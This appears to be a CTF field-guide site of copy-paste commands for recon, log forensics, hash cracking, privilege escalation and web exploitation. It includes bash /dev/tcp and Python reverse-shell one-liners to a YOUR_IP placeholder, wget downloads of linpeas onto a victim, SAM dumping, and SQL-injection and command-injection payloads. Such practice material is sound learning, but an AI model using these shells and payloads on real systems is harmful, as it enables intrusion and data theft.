docs.title: 🚩 Welcome to the ctf-toolkit
docs.text:
A curated arsenal of tools, commands, and workflows for Capture The Flag competitions.

This toolkit is designed to be your quick-reference field guide during CTFs. It cuts through the noise and provides the exact commands and syntax you need to solve challenges in Recon, Crypto, Web, and Pwn.

docs.title: ⚡ Quick Access
docs.text:
• Reconnaissance & Enumeration --- Start here. Network scanning, OSINT, and finding the attack surface. Go to Recon

  • Web Exploitation --- SQL Injection, XSS, and web shell payloads. Go to Web

  • Cryptography & Steganography --- Identify ciphers, crack hashes, and analyze steganography. Go to Crypto

  • Forensics & Log Analysis --- Log analysis, file carving, and digital investigation. Go to Forensics

  • Reverse Engineering & Malware --- Decompilers, binary analysis, and malware dissection. Go to RevEng

  • Privilege Escalation & Shells --- Stabilize your shell, transfer files, and become root. Go to PrivEsc

  • Command Cheat Sheet --- Essential Linux one-liners and syntax memory refreshers. Go to Commands

docs.title: 🛠️ Philosophy
docs.text:
• Speed: Copy-paste ready commands.
  • Simplicity: No long theories, just practical application.
  • Reliability: Only tools that actually work in CTFs.

Maintained by xaxa-0x3f

docs.title: ⌨️ Command Cheat Sheet
docs.text: Essential commands for CTFs, Linux, and basic hacking. Memorize these to speed up your workflow.

docs.title: 🏆 Daily Practice
docs.text: The only way to get fast is repetition. Try to use the terminal for everything you can.

docs.title: 🐧 File System & Navigation
docs.text: Command Description ls -la List all files (including hidden .files) with permissions. pwd Print Working Directory (Where am I?). cd - Go back to the previous directory you were in. find . -name "flag.txt" Find a specific file in the current folder. find / -name "flag.txt" 2>/dev/null Find a file across the whole system (ignoring errors). grep -r "password" . Search for a specific text string inside all files in the folder. locate filename Faster search (uses a pre-built database). which python3 Shows the path to a binary/program.

docs.title: 📖 Reading & Editing Files
docs.text: Command Description cat file.txt Dump the whole file to the screen. less file.txt Scroll through a long file (Press q to quit). head -n 20 file.txt Show only the first 20 lines. tail -f access.log Watch the end of a file in real-time (Great for logs). strings binary.exe Extract readable text from a compiled program (Essential for CTFs!). xxd file.bin View the Hexdump of a file.

docs.title: 🌐 Networking & Recon
docs.text: Command Description ip a Show your IP address and interfaces. curl ifconfig.me Show your Public IP address. ping -c 4 8.8.8.8 Test connectivity (stop after 4 pings). netstat -antp Show all active connections and open ports. ss -tulpn Faster version of netstat (Listening ports). nc -lvnp 4444 Start a Netcat Listener (Wait for a reverse shell). nc <target_ip> <port> Connect to a remote port manually.

docs.title: 📥 File Transfer
docs.text:
When you have a shell but need to upload a script.

1. Python Web Server (Run this on YOUR machine) 

python3 -m http.server 8000

2. Download command (Run this on the TARGET) 

wget http://<your_ip>:8000/linpeas.sh
# OR
curl http://<your_ip>:8000/linpeas.sh -o linpeas.sh

docs.title: ⚡ Permission & Execution
docs.text: Command Description chmod +x script.sh Make a script executable (Run it with ./script.sh). chown user:user file Change ownership of a file. sudo -l Check what you can run as root (Privilege Escalation check). id Show current user ID and group memberships. w See who else is logged into the system. uname -a Show kernel and system information.

docs.title: 🔐 Archives & Compression
docs.text: Command Description tar -xvf file.tar Extract a .tar archive. tar -xzvf file.tar.gz Extract a compressed .tar.gz. unzip file.zip Extract a zip file. gunzip file.gz Decompress a .gz file.

docs.title: 🥷 CTF "Magic" Tricks
docs.text:
• Base64 Decode: 
    echo "SGVsbG8=" | base64 -d
  • MD5 Hash a file: 
    md5sum file.txt
  • Watch a command (Auto-refresh): 
    watch -n 1 'ls -la'
  • Re-run last command as sudo: 
    sudo !!
  • Spawn a TTY Shell (Python): 
    python3 -c 'import pty; pty.spawn("/bin/bash")'

docs.title: 🔎 Forensics & Log Analysis
docs.text: Blue team skills: finding the needle in the haystack.

docs.title: Quick Filters (The "Top 10" Method)
docs.text:
Find the noisiest IP address in a log file (likely the attacker).

cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -10

docs.title: Status Code Hunting
docs.text:
• 200 (OK): Success. Did they steal data?
  • 404 (Not Found): Scanning/Fuzzing.
  • 500 (Server Error): They broke something (SQLi attempts).
# Show only successful requests from a suspect IP
grep "192.168.1.5" access.log | grep " 200 "

docs.title: User-Agent Analysis
docs.text:
Attackers often use default tool agents (sqlmap, curl, python). 

cat access.log | awk -F\" '{print $6}' | sort | uniq -c | sort -nr

docs.title: File Types & Metadata
docs.text:
• Check real type: file unknown_file
  • Read metadata: exiftool unknown_file
  • Hex Dump: xxd unknown_file | head

docs.title: Strings
docs.text:
Extract readable text from binaries or memory dumps. 

strings -n 6 binary.exe | less
# -n 6: Only show strings longer than 6 chars (reduces noise)

docs.title: 📜 Log Analysis
docs.text: A guide to finding the needle in the haystack. In CTFs, logs are usually massive text files containing evidence of an attack.

docs.title: 🧰 The Toolkit
docs.text: Tool Link Best For Excel Online Use in Browser Sorting CSVs visually without installing Office. Google Sheets Use in Browser Great for filtering by IP columns. lnav lnav.org Advanced log navigator for the terminal (Color coded). CyberChef CyberChef Decoding base64/hex strings found inside logs. Drone Logs AirData Upload DJI flight logs to see the flight path on a map.

docs.title: 🧠 CLI Analysis Workflow
docs.text: Don't read lines one by one. Filter the noise using the terminal.

docs.title: 1. The "Top 10" Method
docs.text:
Find out who is making the most noise. The IP with thousands of hits is usually the attacker.

cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -10

docs.title: 2. Filter by Status Code
docs.text:
• 200 (OK): The attacker successfully loaded a page or stole a file.
  • 404 (Not Found): The attacker is guessing file names (scanning).

  • 500 (Server Error): The attacker broke something (likely SQL Injection).

docs.title: Show me only successful requests from a specific IP
docs.text: grep "192.168.1.5" access.log | grep " 200 "

docs.title: 3. User-Agent Hunting
docs.text:
Attackers often forget to change their tool's signature. Look for non-browser agents.

# Show unique User-Agents
cat access.log | awk -F\" '{print $6}' | sort | uniq -c | sort -nr

Look for: sqlmap, nikto, gobuster, python-requests, curl.

docs.title: 🚩 Common Attack Patterns
docs.text:
What to grep for when looking for specific hacks.

Attack Type Pattern to Search Example Log Entry SQL Injection UNION, SELECT, ' OR 1=1, %27 index.php?id=1' UNION SELECT user,pass-- XSS <script>, alert(, onerror=, %3Cscript%3E search.php?q=<script>alert(1)</script> Directory Traversal ../, ..%2f, /etc/passwd, boot.ini download.php?file=../../../../etc/passwd Command Injection ;, |, &&, $(, whoami ping.php?ip=8.8.8.8; whoami Web Shells cmd=, exec=, system=, eval shell.php?cmd=ls

docs.title: 💡 Pro Tips
docs.text:
1. Decode on the fly: If you see %20 or %27, that is URL encoding. Use CyberChef to decode it to see the real attack.
  2. Timeline is key: Once you find the first successful attack (a 200 OK on a malicious payload), look at everything that happened after that second.
  3. Exclude the noise: If index.php is cluttering your view, remove it: grep -v "index.php" access.log.

docs.title: 📄 File Cracking (Preparation)
docs.text:
Before cracking a file, you need to turn it into a "hash" that John can read.

PDF FilesZip FilesWindows SAM

Use pdf2john to extract the hash. 

# Install: usually comes with John
pdf2john file.pdf > hash.txt

Use zip2john or fCrackZip. 

zip2john file.zip > hash.txt
# OR
apt install fcrackzip

Dump the SAM database. 

# Requires samdump2
apt install samdump2
samdump2 SYSTEM SAM > hashes.txt

docs.title: 🔌 Reverse Shells
docs.text:
Connect back to your machine.

1. Start Listener (Your Machine): 

nc -lvnp 4444

2. Execute Payload (Victim Machine): * Bash: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 * Python: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

docs.title: 📥 File Transfer
docs.text:
Getting scripts (like linpeas) onto the target.

Method A: Python Server 1. Attacker: python3 -m http.server 8000 2. Victim: wget http://YOUR_IP:8000/linpeas.sh

Method B: Netcat 1. Victim (Receiver): nc -l -p 1234 > file.out 2. Attacker (Sender): nc <victim_ip> 1234 < file.in

docs.title: 📡 Reconnaissance & Enumeration
docs.text:
The art of finding the target. If you can't find it, you can't hack it.

Methodology

1. Scope: Identify your target IP or Domain. 2. Scan: Find open ports and running services. 3. Enumerate: Interrogate those services for versions, users, and shares. 4. OSINT: Find public info (passive recon).

docs.title: IP & Connectivity
docs.text:
Start by verifying your connection to the target/box.

Command Description ip a Show your IP address and interfaces (tun0 is usually VPN). ping -c 4 <ip> Test connectivity (stop after 4 pings). fping -a -g 192.168.1.0/24 Ping sweep an entire subnet to find live hosts. arp-scan -l Scan local network (Layer 2) for devices.

docs.title: Port Scanning
docs.text:
Find the doors.

Nmap (Standard)Rustscan (Fast)Masscan (Large Scale)

The gold standard. Reliable but can be slow. 

# Basic Safe Scan (Scripts + Versions)
nmap -sC -sV -oA nmap_initial <target_ip>

# All Ports (Thorough)
nmap -p- -T4 <target_ip>

# UDP Scan (Don't forget this!)
sudo nmap -sU --top-ports 100 <target_ip>

Much faster than Nmap. Great for the initial "rush". 

# Scan all ports in seconds, then pipe to Nmap
rustscan -a <target_ip> -- -sC -sV

When you need to scan the entire internet (or a huge subnet). 

masscan -p1-65535 <target_ip> --rate=1000

docs.title: 🔬 Service Enumeration
docs.text: You found an open port. Now, what is it doing?

docs.title: 📁 SMB (Windows Shares)
docs.text:
Port 139 / 445 Often contains sensitive files or credentials.

# List shares (Null Session)
smbclient -L //<target_ip> -N

# Connect to a share
smbclient //<target_ip>/sharename -N

# Linux Enum Tool (Runs everything)
enum4linux -a <target_ip>

docs.title: 📂 NFS (Linux Shares)
docs.text:
Port 2049 Network File Systems often have weak permissions.

# List available mounts
showmount -e <target_ip>

# Mount it to your machine
sudo mount -t nfs <target_ip>:/home/remote_folder /mnt/local_folder

docs.title: 🌐 DNS (Domain Names)
docs.text:
Port 53 Look for hidden subdomains or internal network info.

# Zone Transfer (Try to steal the whole map)
dig axfr @<target_ip> domain.com

# Reverse Lookup
dig -x <target_ip>

docs.title: 🕸️ Web Enumeration
docs.text: Finding hidden pages and subdomains.

docs.title: Directory Brute-Forcing
docs.text:
Finding /admin, /login, /backup.

GobusterFeroxbuster 
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

Recursive and fast (Written in Rust). 

feroxbuster -u http://<target_ip>

docs.title: Subdomain Enumeration
docs.text:
Finding dev.site.com or vpn.site.com.

# FFUF (Fuzz Faster U Fool)
ffuf -u [http://site.com](http://site.com) -H "Host: FUZZ.site.com" -w /usr/share/wordlists/subdomains.txt

docs.title: 🌐 Web Exploitation
docs.text: Techniques for breaking web applications.

docs.title: SQL Injection (SQLi)
docs.text:
Manipulate the database query.

Type Pattern Payload Example Auth Bypass ' OR 1=1 admin' OR 1=1 -- Union Based UNION SELECT ' UNION SELECT user, password FROM users -- Comment Out -- or # admin' #

docs.title: Command Injection
docs.text:
Execute OS commands via the web app.

Separator Example Description ; 127.0.0.1; id Run command after the first one finishes. | 127.0.0.1 | id Pipe output (might break flow). && 127.0.0.1 && id Run only if first command succeeds. $() $(id) Inline execution.
